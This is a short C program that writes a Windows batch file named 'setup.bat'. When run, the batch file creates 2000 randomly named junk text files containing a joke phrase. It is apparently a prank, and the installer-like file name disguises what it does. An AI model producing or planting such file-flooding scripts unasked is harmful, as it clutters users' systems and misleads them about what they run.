#include <stdio.h>
#include <stdlib.h>
#define PATH "setup.bat"

int main()
{
    FILE *fp = fopen(PATH, "w");

    fprintf(fp,
            "@echo off\n"
            "setlocal EnableDelayedExpansion\n"
            "set count=0\n"
            ":start\n"
            "if !count! geq 2000 goto end\n"
            "echo juice pilado ... Mosambi kaa > hehehe%%random%%.txt\n"
            "set /a count+=1\n"
            "goto start\n"
            ":end\n");

    fclose(fp);
    return 0;
}
